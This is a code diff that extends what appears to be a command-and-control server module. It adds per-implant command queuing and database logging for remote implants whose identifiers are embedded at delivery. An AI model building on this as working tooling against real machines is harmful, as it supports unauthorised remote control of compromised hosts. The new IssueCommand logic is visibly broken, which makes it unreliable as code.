@@ -1,17 +1,38 @@
+from Database import Database
 class ImplantSingleton:
     class __OnlyOne:
         UID = None
+        # -- REMOVE QUEUEDCOMMANDS
         QueuedCommands = []
+
+        RegisteredCommands = {}
+
         CommandOutput = []
         # worth adding to the logging based on the commands issued here.
-        def AddCommand(self, command):
-            # Add record to issues command table with username - time - command - UID
-            print("Adding CMD:",command)
-            print("Current CMD list LEN:",len(self.QueuedCommands))
-            self.QueuedCommands.append(command)
+        # -- ON BOOT READ LOG FILE AND PULL UNPULLED COMMANDS
 
-        def IssueCommand(self):
+        def AddCommand(self, User, Implant, Command):
+            # Add record to issues command table with username - time - command - UID
+            # Implement the logging calls to ensure entries got to DB. and get recorded on pick up
+            print("Adding CMD:",Command)
+            db.Register_ImplantCommand(User, Implant, Command)
+            # -- REMOVE: BELOW
+            self.QueuedCommands.append(Command)
+
+            if  Implant not in self.RegisteredCommands:
+                self.RegisteredCommands[Implant] = []
+                # print("Implant not in dict")
+            self.RegisteredCommands[Implant].append(Command)
+            # print(self.RegisteredCommands[Implant])
+            print("Current CMD list LEN:", len(self.QueuedCommands))
+
+        def IssueCommand(self,IID=0):
             if len(self.QueuedCommands) > 0:
+                # -- Issue command based on unique implant identifiers (UII)
+                # -- UII is embedded into the implant via Jinja on delivery.
+                db.Get_ImplantKey(IID)
+                if IID not in self.RegisteredCommands:
+                    a = self.RegisteredCommands['IID'].pop()
                 return self.QueuedCommands.pop()
             else:
                 return "=="
@@ -30,6 +51,6 @@ class ImplantSingleton:
         else:
             ImplantSingleton.instance.val = arg
 
-
+db = Database()
 x = ImplantSingleton()
 
